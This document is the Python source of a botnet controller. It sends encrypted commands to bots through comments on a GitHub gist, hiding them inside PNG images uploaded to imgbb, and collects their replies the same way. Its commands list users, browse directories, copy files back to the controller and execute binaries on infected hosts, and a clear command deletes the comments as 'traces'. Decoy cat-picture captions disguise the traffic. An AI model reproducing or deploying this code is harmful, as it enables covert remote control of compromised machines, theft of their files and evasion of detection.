#!/usr/bin/env python3
import requests
import json
import base64
import random
from Crypto.Cipher import ChaCha20
from time import sleep
import os

import curses

from threading import Lock, Thread


# API keys and API related stuff
GITHUB_API = "https://api.github.com" # leave it this way
API_TOKEN = "YOUR-GISTS-API-TOKEN-HERE"
GIST_ID = "79b23febd9c75a7657887689ece51198" # id of gist used for communication, feel free to use this
IMGBB_KEY = "c64cefbdc4fb4676cf79396550df94b0" # eventually create an api key @ imgbb.com, feel free to use this

# Authentication credentials and symmetric key for encryption (change default key value with 32 bytes)
CHACHA20_KEY: bytes = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
USERNAME: str = None # admin
PASSWORD: str = None # strongpw1337

# configuration variables
HEARTBEAT_INTERVAL = 12 # N * 5 seconds
FILE_PATH = "./recv_files" # where copied files will be saved

# Shared variables and locks
HIDDEN_BYTE_SIZE = 8 # number of bytes in which store the size of hidden payloads, must be in sync with bot
BOX_LINES = []
COMMENT_INDEX = 0
RUNNING = False
s_print_lock = Lock()
s_clear_lock = Lock()
s_scroll_lock = Lock()

### FUNCTIONS SHARED WITH BOT ###
def encrypt_payload(payload: str):
    cipher = ChaCha20.new(key=CHACHA20_KEY)
    enc = base64.b64encode( cipher.encrypt(payload.encode()) ).decode('utf-8')
    nonce = base64.b64encode(cipher.nonce).decode('utf-8')
    return enc, nonce

def decrypt_payload(payload: str, nonce: str):
    cipher = ChaCha20.new(key=CHACHA20_KEY, nonce=base64.b64decode(nonce))
    dec = cipher.encrypt(base64.b64decode(payload)).decode('utf-8')
    return dec

def prepare_payload(data: object, type: str):
    enc, nonce = encrypt_payload(json.dumps(data))
    payload = {"type": type, "enc": enc, "nonce": nonce}
    payload = json.dumps(payload).encode()
    return payload

def send_comment(body):
    headers = {'Authorization': f'token  {API_TOKEN}', "Accept": "application/vnd.github.v3+json"}
    payload = {"body": body}
    path = f"/gists/{GIST_ID}/comments"
    url = GITHUB_API+path
    res = requests.post(url, headers=headers, data=json.dumps(payload))

    return res

def get_comments():
    headers = {'Authorization': f'token  {API_TOKEN}', "Accept": "application/vnd.github.v3+json"}
    path = f"/gists/{GIST_ID}/comments"
    url = GITHUB_API+path
    res = requests.get(url, headers=headers, params={"page": -1, "per_page": 100})
    comms = res.json()
    return comms

def get_new_comments():
    global COMMENT_INDEX
    comms = get_comments()

    if len(comms) < COMMENT_INDEX:
        # controller is deleting comments
        prev_len = len(comms)
        while True:
            sleep(1)
            comms = get_comments()
            if prev_len == len(comms):
                break
            else:
                prev_len = len(comms)
        COMMENT_INDEX = 0

    comments = [{"body": comms[i]["body"], "id": comms[i]["id"]} for i in range(COMMENT_INDEX, len(comms))]
    return comments

def upload_image(img: bytes, expiration: int=3600):
    data = {"key":IMGBB_KEY, "image": img.decode(), "expiration": expiration}
    res = requests.post("https://api.imgbb.com/1/upload", data)
    return res

def secret_from_comment(body):
    if "![Very funny cat](" in body or "![](" in body:
        try:
            url = body.split("(")[-1][:-1]
            with requests.get(url) as r:
                img =  r.content
            size = int.from_bytes(img[-HIDDEN_BYTE_SIZE:], "little")
            secret =  img[-(HIDDEN_BYTE_SIZE+size):-HIDDEN_BYTE_SIZE]
            return secret
        except:
            return '{"type": null}'
    else:
        return '{"type": null}'
########## END SHARED FUNCTIONS ##########


###### COMMANDS ###########
def cmd_w():
    if not check_creds():
        return "Login first.", None


    cmd = {"cmd": "w", "args": [], "user": USERNAME, "pw": PASSWORD}
    payload = prepare_payload(cmd, "req")
    r = comment_hidden_image(payload)

    if(r.status_code >= 200 & r.status_code < 300):
        js = r.json()
        data = {"user": USERNAME, "cmd_id": js["id"], "cmd": "W"}
        return "Successfully sent w command.", data
    else:
        return "W command failed.", None

def cmd_id():
    if not check_creds():
        return "Login first.", None

    cmd = {"cmd": "id", "args": [], "user": USERNAME, "pw": PASSWORD}
    payload = prepare_payload(cmd, "req")

    r = comment_hidden_image(payload)

    if(r.status_code >= 200 & r.status_code < 300):
        js = r.json()
        data = {"user": USERNAME, "cmd_id": js["id"], "cmd": "ID"}
        return "Successfully sent id command.", data
    else:
        return "ID command failed.", None

def cmd_ls(tokens: list):
    if not check_creds():
        return "Login first.", None

    if len(tokens) < 2:
        return "LS requires at least <PATH> parameter.", None

    cmd = {"cmd": "ls", "args": tokens[1:], "user": USERNAME, "pw": PASSWORD}
    payload = prepare_payload(cmd, "req")

    r = comment_hidden_image(payload)

    if(r.status_code >= 200 & r.status_code < 300):
        js = r.json()
        data = {"user": USERNAME, "cmd_id": js["id"], "cmd": ' '.join(tokens).strip()}
        return "Successfully sent ls command.", data
    else:
        return "LS command failed.", None

def cmd_cp(tokens: list):
    if not check_creds():
        return "Login first.", None

    if len(tokens) < 2:
        return "CP requires <PATH> parameter.", None

    cmd = {"cmd": "cp", "args": [tokens[1]], "user": USERNAME, "pw": PASSWORD}
    payload = prepare_payload(cmd, "req")

    r = comment_hidden_image(payload)

    if(r.status_code >= 200 & r.status_code < 300):
        js = r.json()
        data = {"user": USERNAME, "cmd_id": js["id"], "cmd": f"CP {tokens[1].strip()}"}
        return "Successfully sent cp command.", data
    else:
        return "cp command failed.", None

def cmd_exec(tokens: list):
    if not check_creds():
        return "Login first.", None

    if len(tokens) < 2:
        return "EXEC requires <PATH> parameter.", None

    cmd = {"cmd": "exec", "args": tokens[1:], "user": USERNAME, "pw": PASSWORD}
    payload = prepare_payload(cmd, "req")

    r = comment_hidden_image(payload)

    if(r.status_code >= 200 & r.status_code < 300):
        js = r.json()
        data = {"user": USERNAME, "cmd_id": js["id"], "cmd": f"{' '.join(tokens).strip()}"}
        return "Successfully sent exec command.", data
    else:
        return "exec command failed.", None

def cmd_login(tokens: list):
    global USERNAME
    global PASSWORD

    try:
        USERNAME = tokens[1]
        PASSWORD = tokens[2]
        return f"Credentials initialized.", None
    except:
        USERNAME = None
        PASSWORD = None
        return "Failed to initialize credentials", None

def cmd_clear():
    headers = {'Authorization': f'token  {API_TOKEN}', "Accept": "application/vnd.github.v3+json"}
    path = f"/gists/{GIST_ID}/comments/"

    with s_clear_lock:
        while True:
            cm = get_comments()
            if len(cm) == 0:
                break
            for c in cm:
                url = GITHUB_API+path+str(c["id"])
                requests.delete(url, headers=headers)

    return f"Successfully deleted traces.", None

def cmd_scroll(screen, win):
    max_y, _ = win.getmaxyx()

    if len(BOX_LINES) < max_y:
        return
    pos = len(BOX_LINES) - max_y + 1

    with s_scroll_lock, s_print_lock:
        curses.noecho()

        while True:
            try:
                ch = screen.getch()
            except KeyboardInterrupt:
                break
            if ch == ord("q"):
                break
            elif ch == 65:
                if pos > 0:
                    pos -= 1
                    win.scroll(-1)
                    win.addstr(0, 0, BOX_LINES[pos])
                    win.refresh()

            elif ch == 66:
                if pos+max_y-1 < len(BOX_LINES):
                    win.addstr(max_y-1, 0, BOX_LINES[pos+max_y-1])
                    win.refresh()
                    pos += 1

        win.clear()
        for i in range(len(BOX_LINES)-max_y-1, len(BOX_LINES)):
            win.addstr(BOX_LINES[i])

        win.refresh()
        curses.echo()

def cmd_help(tokens: list):
    helps = {"W": "Requests the list of users currently logged in.",
            "ID": "Requests the id of the current user.",
            "LS": "Requests the file listing of specified <PATH>.",
            "CP": "Requests the copy of file at <PATH> to the controller machine.",
            "EXEC": "Requests the execution of the binary specified by <PATH>, passing given <ARGS>.",
            "LOGIN": "First command to be performed, initializes username and password used for authentication.",
            "HELP": "Explains commands.",
            "CLEAR": "Deletes all comments from gist.",
            "SCROLL": "Enters text scrolling mode.",
            "Q": "Quits the controller."}
    try:
        return helps[tokens[1].upper()], None
    except:
        return "Unknown command.", None
######## END OF COMMANDS #######


def safe_print(box, s:str):
    with s_print_lock:
        y_prev, x_prev = curses.getsyx()
        for line in s.strip().split("\n"):
            BOX_LINES.append(line+"\n")
        box.addstr(s)
        box.refresh()
        curses.setsyx(y_prev, x_prev)
        curses.doupdate()

def comment_hidden_image(payload: bytes):
    if len(payload) > 8**(HIDDEN_BYTE_SIZE):
        return None

    captions = ["Nothing suspicious here!",
                "Hello world!",
                "There's nothing here! Move!!",
                "Command for a bot? You must be crazy if you think there's one here...",
                "Beeep booop beeep beep... Ahem sorry, I mean \"What a nice day to be a human!\"",
                "This gist is awesome, thank you!",
                "I wonder if someone is going to post some pictures of cute cats...",
                "Hey Google! Execute world domination!",
                "I am 90% sure somebody is going to post some cat picture very soon!"
                ]

    TRANSPARENT_IMG = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x01\x03\x00\x00\x00%\xdbV\xca\x00\x00\x00\x03PLTE\x00\x00\x00\xa7z=\xda\x00\x00\x00\x01tRNS\x00@\xe6\xd8f\x00\x00\x00\nIDAT\x08\xd7c`\x00\x00\x00\x02\x00\x01\xe2!\xbc3\x00\x00\x00\x00IEND\xaeB`\x82'
    hidden = base64.b64encode(TRANSPARENT_IMG + payload + len(payload).to_bytes(HIDDEN_BYTE_SIZE, 'little'))
    res = upload_image(hidden)

    if(res.status_code == 200):
        url = res.json()["data"]["url"]
        body = f"{random.choice(captions)}![]({url})"
        return send_comment(body)
    else:
        return res

def check_creds():
    return (USERNAME is not None) and (PASSWORD is not None)

def checker_main(box):
    global COMMENT_INDEX

    current_timeslot = 0

    while RUNNING:
        current_timeslot += 1
        with s_clear_lock, s_scroll_lock:
            cm = get_new_comments()
            for c in cm:
                COMMENT_INDEX += 1
                secret = json.loads(secret_from_comment(c["body"]))
                if secret["type"] == "resp":
                    try:
                        dec = json.loads(decrypt_payload(secret["enc"], secret["nonce"]))
                        bot_name = dec["bot_name"]
                        reply_to = dec["reply_to"]
                        output = dec["output"]
                    except:
                        continue
                    if len(output.split('\n')) > 1:
                        s = f"[reply-to={reply_to}]<{bot_name}>:\n{output}\n"
                    else:
                        s = f"[reply-to={reply_to}]<{bot_name}>: {output}\n"
                    safe_print(box, s)

                elif secret["type"] == "file":
                    try:
                        dec = json.loads(decrypt_payload(secret["enc"], secret["nonce"]))
                        bot_name = dec["bot_name"]
                        reply_to = dec["reply_to"]
                        filename = dec["filename"]
                        file = dec["file"]
                        save_path = f"{FILE_PATH}/{bot_name}_{filename}"
                        with open(save_path, "wb") as f:
                            f.write(base64.b64decode(file))

                        s = f"[reply-to={reply_to}]<{bot_name}>: Saved {filename} to {save_path}!\n"
                        safe_print(box, s)
                    except Exception as e:
                        s = f"<Controller> Exception while saving received file: {e}\n"
                        safe_print(box, s)

            if current_timeslot % HEARTBEAT_INTERVAL == 0 and check_creds():
                # send heartbeat command
                cmd = {"cmd": "heartbeat", "args": [], "user": USERNAME, "pw": PASSWORD}
                payload = prepare_payload(cmd, "req")
                r = comment_hidden_image(payload)

                if(r.status_code >= 200 & r.status_code < 300):
                    js = r.json()
                    s = f"[cmd_id={js['id']}]<Controller> Successfully sent heartbeat to bots.\n"
                    safe_print(box, s)
                else:
                    s = f"<Controller> Failed to send heartbeat to bots.\n"
                    safe_print(box, s)

        sleep(5)


def init():
    global COMMENT_INDEX

    if not os.path.exists(FILE_PATH):
        os.makedirs(FILE_PATH)

    try:
        cm = get_new_comments()
        COMMENT_INDEX = len(cm)
    except:
        print("Initialization failed, aborting. Make sure your api token is correct.")
        exit(-1)

def main():
    global RUNNING
    RUNNING = True

    screen = curses.initscr()
    screen.clear()

    screen.refresh()
    num_rows, num_cols = screen.getmaxyx()

    screen.addstr("Commands: w, id, ls <PATH>, cp <PATH>, exec <PATH> <ARGS>, login <USER> <PASSWORD>, help <CMD>, clear, scroll, q\n")
    screen.addstr(">>> ")
    screen.refresh()
    y_inp, x_inp = curses.getsyx()
    screen.addstr(y_inp+1, 0, "\n")
    screen.addstr(num_cols*"#")
    screen.refresh()

    last_y, last_x = curses.getsyx()
    message = b""

    boxed = curses.newwin(num_rows - last_y, num_cols, last_y, last_x)
    boxed.scrollok(1)
    checker = Thread(target=checker_main, args=(boxed, ))
    checker.start()

    while True:
        message = screen.getstr(y_inp, x_inp, 144)
        screen.addstr(y_inp, x_inp, ' '*(num_cols-x_inp)) # clears input
        message = message.decode()
        tokens = message.split(" ")
        tokens[0] = tokens[0].upper()
        data = None

        screen.addstr(y_inp+1, 0, ' '*(num_cols))
        screen.refresh()
        curses.setsyx(y_inp, x_inp)
        curses.doupdate()

        if tokens[0] == "Q" or b"\x03".decode() in message:
            break
        elif tokens[0] == "HELP":
            output, data = cmd_help(tokens)
            screen.addstr(y_inp+1, 0, output)

        elif tokens[0] == "W":
            output, data = cmd_w()
            screen.addstr(y_inp+1, 0, output)

        elif tokens[0] == "ID":
            output, data = cmd_id()
            screen.addstr(y_inp+1, 0, output)

        elif tokens[0] == "LS":
            output, data = cmd_ls(tokens)
            screen.addstr(y_inp+1, 0, output)

        elif tokens[0] == "CP":
            output, data = cmd_cp(tokens)
            screen.addstr(y_inp+1, 0, output)

        elif tokens[0] == "EXEC":
            output, data = cmd_exec(tokens)
            screen.addstr(y_inp+1, 0, output)

        elif tokens[0] == "LOGIN":
            output, data = cmd_login(tokens)
            screen.addstr(y_inp+1, 0, output)

        elif tokens[0] == "CLEAR":
            screen.addstr(y_inp+1, 0, 'Deleting all comments, please be patient (Beware, you may lose some unseen replies!).')
            screen.refresh()
            output, data = cmd_clear()
            screen.addstr(y_inp+1, 0, ' '*(num_cols))
            screen.addstr(y_inp+1, 0, output)

        elif tokens[0] == "SCROLL":
            screen.addstr(y_inp+1, 0, 'Up/Down keys to scroll, q or ^C to exit scrolling mode.')
            screen.refresh()
            cmd_scroll(screen, boxed)
            screen.addstr(y_inp+1, 0, ' '*(num_cols))
        else:
            screen.addstr(y_inp+1, 0, 'Unknown command.')

        screen.refresh()
        if(data is not None):
            s = f"[cmd_id={data['cmd_id']}]<{data['user']}> {data['cmd']}\n"
            safe_print(boxed, s)

    RUNNING = False
    screen.addstr(y_inp+1, 0, ' '*(num_cols))
    screen.addstr(y_inp+1, 0, 'Waiting for checker termination...')
    screen.refresh()
    checker.join()
    boxed.erase()
    del boxed
    curses.endwin()

if __name__ == "__main__":
    init()
    main()
